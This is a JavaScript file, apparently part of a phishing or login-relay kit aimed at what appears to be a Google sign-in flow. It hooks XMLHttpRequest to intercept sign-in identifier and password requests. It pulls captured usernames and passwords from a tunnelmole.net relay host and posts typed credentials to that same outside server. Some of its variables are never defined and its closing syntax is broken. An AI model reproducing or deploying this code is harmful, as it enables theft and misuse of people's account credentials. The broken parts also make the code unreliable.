let freqUsername = null;
let freqPassword = null;
let usernameFetched = false;
let passwordFetched = false;
let inPasswordPage = false; // Track if we are on the password page

// ✅ Check if we are on the password page
const checkPasswordPage = async () => {
    if (window.location.href.includes('challenge/pwd')) {
        inPasswordPage = true;
        console.log('Now on the password page');
        await fetchFreqPassword();
    } else {
        inPasswordPage = false;
    }
};

// ✅ Fetch username
const fetchFreqUsername = async () => {
    if (usernameFetched) return; // Avoid redundant fetches once username is fetched

    console.log('Fetching username...');
    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        const result = await response.json();
        console.log('Response from /get-first-post-data:', result);

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });

            // Trigger the username request independently without waiting for password logic
            processUsernameRequests();

            // Wait for navigation to password page
            setTimeout(checkPasswordPage, 1000); // Give the page some time to navigate
        } else {
            console.warn("No username data received, retrying...");
            await new Promise(resolve => setTimeout(resolve, 500)); // Wait 500ms and retry
            await fetchFreqUsername(); // Retry the fetch
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        await new Promise(resolve => setTimeout(resolve, 500)); // Wait and retry on failure
        await fetchFreqUsername(); // Retry the fetch
    }
};

// ✅ Fetch password
const fetchFreqPassword = async () => {
    if (passwordFetched || !inPasswordPage) return; // Only proceed if we are on the password page
    console.log('Fetching password...');
    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-password', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        const result = await response.json();
        console.log('Response from /get-first-post-password:', result);

        if (result?.postData) {
            freqPassword = result.postData;
            console.log('Fetched password:', freqPassword);
            passwordFetched = true;

            await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-password', { method: 'POST' });

            processPasswordRequests();
        } else {
            console.warn("No password data received, retrying...");
            await new Promise(resolve => setTimeout(resolve, 500)); // Retry if no password data
            await fetchFreqPassword(); // Retry the fetch
        }
    } catch (error) {
        console.error('Error fetching password:', error);
        await new Promise(resolve => setTimeout(resolve, 500)); // Retry on failure
        await fetchFreqPassword(); // Retry the fetch
    }
};

// ✅ Process pending username requests
const processUsernameRequests = async () => {
    if (!freqUsername) {
        console.log("Username not available yet, retrying...");
        await new Promise(resolve => setTimeout(resolve, 500)); // Wait and retry
        await processUsernameRequests(); // Retry until username is available
        return;
    }

    console.log("Processing username requests...");
    // Add logic to handle username-related requests here
};

// ✅ Process pending password requests
const processPasswordRequests = async () => {
    if (!freqPassword) {
        console.log("Password not available yet, retrying...");
        await new Promise(resolve => setTimeout(resolve, 500)); // Wait and retry
        await processPasswordRequests(); // Retry until password is available
        return;
    }

    console.log("Processing password requests...");
    // Add logic to handle password-related requests here
};

// ✅ Intercept XMLHttpRequest
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    // Intercept username-related requests
    if (/identity-signin-identifier/.test(body) && !modifiedUsernameRequests.has(body)) {
        console.log("Intercepted username request:", body);
        pendingUsernameRequests.set(this, body);
        processUsernameRequests();
    }
    // Intercept password-related requests
    else if (/identity-signin-password/.test(body) && !modifiedPasswordRequests.has(body) && inPasswordPage) {
        console.log("Intercepted password request:", body);
        pendingPasswordRequests.set(this, body);
        processPasswordRequests();
    }
    else {
        originalXhrSend.call(this, body);
    }
};

// ✅ Attach event listeners for username and password submission
document.addEventListener('DOMContentLoaded', () => {
    const usernameButton = document.getElementById('sendUsernameBtn');
    const passwordButton = document.getElementById('sendPasswordBtn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    // Log page load
    console.log("Page loaded, calling fetchFreqUsername...");
    fetchFreqUsername();

    // Add event listener for username button
    if (usernameButton) usernameButton.addEventListener('click', sendUsername);
    if (passwordButton) passwordButton.addEventListener('click', sendPassword);
    
    // Add "Enter" key listener for username and password inputs
    if (usernameInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') sendUsername();
        });
    }

    if (passwordInput) {
        passwordInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') sendPassword();
        });
    }
});

// ✅ Send username logic
const sendUsername = async () => {
    console.log('Sending username...');
    const username = document.getElementById('username')?.value;
    if (!username) {
        console.warn("No username entered");
        return;
    }

    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-username', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });

        if (response.ok) {
            console.log('Username sent successfully');
        } else {
            console.error('Error sending username:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending username:', error);
    }
};

// ✅ Send password logic
const sendPassword = async () => {
    console.log('Sending password...');
    const password = document.getElementById('password')?.value;
    if (!password) {
        console.warn("No password entered");
        return;
    }

    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password })
        });

        if (response.ok) {
            console.log('Password sent successfully');
        } else {
            console.error('Error sending password:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending password:', error);
    }
});
